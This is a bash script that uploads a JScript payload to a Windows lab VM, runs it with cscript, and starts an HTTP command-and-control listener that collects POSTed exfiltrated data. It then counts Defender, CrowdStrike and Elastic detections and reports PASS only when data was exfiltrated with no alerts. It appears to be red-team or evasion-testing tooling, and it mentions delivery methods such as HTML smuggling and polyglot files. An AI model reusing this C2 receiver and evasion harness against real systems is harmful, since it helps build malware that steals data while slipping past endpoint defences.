#!/bin/bash
# Deploy and test a JScript payload on the Windows VM via cscript.exe.
# Usage: deploy_jscript.sh [payload.js] [--c2-port PORT] [--timeout SECS]
#
# For delivery options (html_smuggling, hta, wsf, polyglot, iso), use:
#   deploy_script.sh <payload.js> --delivery html_smuggling
#
# JScript payloads use WinHttp COM for C2 — needs an HTTP listener (not netcat).
# This script starts scripts/c2_http.py or falls back to a simple Python HTTP server.

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
PROJECT_DIR="$(dirname "$SCRIPT_DIR")"

VM_PORT=${VM_PORT:-10022}
VM_USER=${VM_USER:-vmuser}
VM_PASS=${VM_PASS:-vmuser123}
C2_PORT=${C2_PORT:-9001}
VM_SNAPSHOT="${VM_SNAPSHOT:-crowdstrike}"
TIMEOUT=${TIMEOUT:-120}
PAYLOAD="${1:-$PROJECT_DIR/results/latest/payload.js}"
REMOTE_NAME=""

ssh_cmd() {
    sshpass -p "$VM_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -p "$VM_PORT" "$VM_USER@localhost" "$@"
}
scp_cmd() {
    sshpass -p "$VM_PASS" scp -o StrictHostKeyChecking=no -P "$VM_PORT" "$@"
}

# Parse extra args
shift 2>/dev/null || true
while [[ $# -gt 0 ]]; do
    case "$1" in
        --c2-port) C2_PORT="$2"; shift 2 ;;
        --timeout) TIMEOUT="$2"; shift 2 ;;
        *) shift ;;
    esac
done

# Determine remote filename from payload
REMOTE_NAME=$(basename "$PAYLOAD")

cleanup() {
    echo ""
    echo "[*] Restoring VM snapshot..."
    if "$SCRIPT_DIR/vm_snapshot.sh" restore "$VM_SNAPSHOT" 2>/dev/null; then
        echo "  OK (restored $VM_SNAPSHOT)"
    else
        echo "  No snapshot to restore, cleaning up manually..."
        ssh_cmd "del /f \"C:\\Users\\$VM_USER\\Desktop\\$REMOTE_NAME\" 2>nul & taskkill /f /im cscript.exe 2>nul & taskkill /f /im wscript.exe 2>nul" 2>/dev/null || true
        echo "  Done"
    fi
    fuser -k $C2_PORT/tcp 2>/dev/null || true
}
trap cleanup EXIT

echo ""
echo "============================================"
echo "  JSCRIPT DEPLOY & TEST"
echo "============================================"
echo "  Payload:  $PAYLOAD"
echo "  Remote:   $REMOTE_NAME"
echo "  C2 Port:  $C2_PORT"
echo "  Timeout:  ${TIMEOUT}s"
echo "============================================"
echo ""

# Check payload exists
if [ ! -f "$PAYLOAD" ]; then
    echo "[!] Payload not found: $PAYLOAD"
    exit 1
fi

# Step 1: Check VM alive
echo "[1/5] Checking VM connectivity..."
if ! ssh_cmd "echo VM_ALIVE" 2>/dev/null | tr -d '\r' | grep -q "VM_ALIVE"; then
    echo "[!] VM not reachable on port $VM_PORT"
    exit 1
fi
echo "  OK"

# Step 2: Upload payload
echo "[2/5] Uploading JScript payload..."
scp_cmd "$PAYLOAD" "$VM_USER@localhost:Desktop\\$REMOTE_NAME" 2>/dev/null
echo "  OK — uploaded $(stat -c%s "$PAYLOAD") bytes"

# Step 3: Start HTTP C2 listener
# JScript uses WinHttp COM which requires real HTTP responses — netcat won't work
echo "[3/5] Starting HTTP C2 listener on :$C2_PORT..."
fuser -k $C2_PORT/tcp 2>/dev/null || true
sleep 1

C2_LOG="$PROJECT_DIR/results/latest/c2_jscript_$(date +%Y%m%d_%H%M%S).log"
if [ -f "$SCRIPT_DIR/c2_http.py" ]; then
    python3 -u "$SCRIPT_DIR/c2_http.py" "$C2_PORT" > "$C2_LOG" 2>&1 &
    C2_PID=$!
    C2_TYPE="c2_http.py"
else
    # Fallback: simple Python HTTP server that accepts POSTs and saves data
    python3 -u -c "
import http.server, sys, os, time
port = int(sys.argv[1]) if len(sys.argv) > 1 else 9001
timeout = int(sys.argv[2]) if len(sys.argv) > 2 else 120
out = 'exfil_js_' + str(int(time.time())) + '.bin'
total = 0

class H(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        global total
        n = int(self.headers.get('Content-Length', 0))
        data = self.rfile.read(n) if n else b''
        with open(out, 'ab') as f:
            f.write(data)
        total += len(data)
        self.send_response(200)
        self.send_header('Content-Length', '2')
        self.end_headers()
        self.wfile.write(b'OK')
        print(f'POST {self.path}: {len(data)}B (total: {total}B)', flush=True)
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Length', '2')
        self.end_headers()
        self.wfile.write(b'OK')
    def log_message(self, *a): pass

srv = http.server.HTTPServer(('0.0.0.0', port), H)
srv.timeout = 1
deadline = time.time() + timeout
print(f'HTTP C2 on :{port} -> {out} (timeout {timeout}s)', flush=True)
while time.time() < deadline:
    srv.handle_request()
    if total > 0 and time.time() > deadline - timeout + 30:
        break
srv.server_close()
print(f'Done: {total}B received -> {out}', flush=True)
" "$C2_PORT" "$TIMEOUT" > "$C2_LOG" 2>&1 &
    C2_PID=$!
    C2_TYPE="fallback HTTP"
fi

sleep 1
if ! kill -0 $C2_PID 2>/dev/null; then
    echo "  [!] C2 listener failed to start"
    cat "$C2_LOG" 2>/dev/null | tail -5 | sed 's/^/    /'
    exit 1
fi
echo "  OK — $C2_TYPE PID $C2_PID (timeout: ${TIMEOUT}s)"

# Step 4: Execute via cscript
echo "[4/5] Executing via cscript on VM..."
ssh_cmd "cscript //nologo //E:jscript \"C:\\Users\\$VM_USER\\Desktop\\$REMOTE_NAME\"" >/dev/null 2>&1 &
EXEC_PID=$!

echo "  Waiting for C2 data..."
wait $C2_PID 2>/dev/null || true

# Also wait a bit for the exec to finish
wait $EXEC_PID 2>/dev/null || true

# Step 5: Validate results
echo "[5/5] Validating results..."
echo ""

# Find the exfil data file
EXFIL_FILE=""
EXFIL_SIZE=0
# Check c2_http.py output (writes exfil_*.bin in cwd)
for f in "$PROJECT_DIR"/exfil_*.bin; do
    if [ -f "$f" ]; then
        sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
        if [ "$sz" -gt "$EXFIL_SIZE" ]; then
            EXFIL_SIZE=$sz
            EXFIL_FILE=$f
        fi
    fi
done
# Also check results/latest
for f in "$PROJECT_DIR"/results/latest/exfil_*.bin; do
    if [ -f "$f" ]; then
        sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
        if [ "$sz" -gt "$EXFIL_SIZE" ]; then
            EXFIL_SIZE=$sz
            EXFIL_FILE=$f
        fi
    fi
done

# Check Defender detections
DEFENDER_DETECTIONS=$(ssh_cmd 'powershell -Command "(Get-MpThreatDetection | Where-Object { $_.InitialDetectionTime -gt (Get-Date).AddMinutes(-5) }).Count"' 2>/dev/null | tr -d '\r' | grep -E '^[0-9]+$' || echo "0")

# Check CrowdStrike
CS_STATUS="n/a"
CS_EVENTS="0"
if ssh_cmd 'sc query csfalconservice' 2>/dev/null | tr -d '\r' | grep -q "RUNNING"; then
    CS_STATUS="active"
    CS_EVENTS=$(ssh_cmd 'powershell -Command "(Get-WinEvent -LogName \"CrowdStrike Falcon/Operational\" -MaxEvents 50 -ErrorAction SilentlyContinue | Where-Object { $_.TimeCreated -gt (Get-Date).AddMinutes(-5) -and $_.LevelDisplayName -match \"Warning|Error|Critical\" }).Count"' 2>/dev/null | tr -d '\r' | grep -E '^[0-9]+$' || echo "0")
fi

# Check Elastic alerts
ELASTIC_ALERTS="0"
if command -v curl &>/dev/null; then
    ELASTIC_ALERTS=$(curl -sk -u elastic:changeme "https://localhost:9200/.alerts-security*/_search?size=100" 2>/dev/null | python3 -c "
import json, sys
DEPLOY_NOISE = {'schtasks.exe','tasklist.exe','HOSTNAME.EXE','hostname.exe','cmd.exe','sshd.exe','reg.exe','cscript.exe'}
data = json.load(sys.stdin)
count = 0
for h in data.get('hits',{}).get('hits',[]):
    s = h.get('_source',{})
    proc = s.get('process',{}).get('name','')
    parent = s.get('process',{}).get('parent',{}).get('name','')
    if proc in DEPLOY_NOISE or parent in ('sshd.exe','cmd.exe'):
        continue
    count += 1
print(count)
" 2>/dev/null || echo "0")
fi

echo "============================================"
echo "  RESULTS"
echo "============================================"
echo "  C2 data:          $EXFIL_SIZE bytes"
echo "  Exfil file:       ${EXFIL_FILE:-none}"
echo "  Defender:         $DEFENDER_DETECTIONS detections"
echo "  CrowdStrike:      ${CS_STATUS} — $CS_EVENTS events"
echo "  Elastic alerts:   $ELASTIC_ALERTS"
echo "  C2 log:           $C2_LOG"
echo "============================================"

if [ "$EXFIL_SIZE" -gt 0 ] && [ -n "$EXFIL_FILE" ]; then
    echo ""
    echo "  Data preview:"
    strings "$EXFIL_FILE" | head -10 | sed 's/^/    /'
fi

if [ "$EXFIL_SIZE" -gt 0 ] && [ "$DEFENDER_DETECTIONS" = "0" ] && [ "$ELASTIC_ALERTS" = "0" ] && [ "$CS_EVENTS" = "0" ]; then
    echo ""
    echo "  OVERALL: PASS"
    # Move exfil file to results
    if [ -n "$EXFIL_FILE" ] && [ -d "$PROJECT_DIR/results/latest" ]; then
        mv "$EXFIL_FILE" "$PROJECT_DIR/results/latest/" 2>/dev/null || true
    fi
    exit 0
else
    echo ""
    echo "  OVERALL: FAIL"
    [ "$EXFIL_SIZE" -eq 0 ] && echo "    - No C2 data received"
    [ "$DEFENDER_DETECTIONS" != "0" ] && echo "    - Defender detected ($DEFENDER_DETECTIONS threats)"
    [ "$CS_EVENTS" != "0" ] && echo "    - CrowdStrike events ($CS_EVENTS)"
    [ "$ELASTIC_ALERTS" != "0" ] && echo "    - Elastic alerts fired ($ELASTIC_ALERTS)"
    exit 1
fi
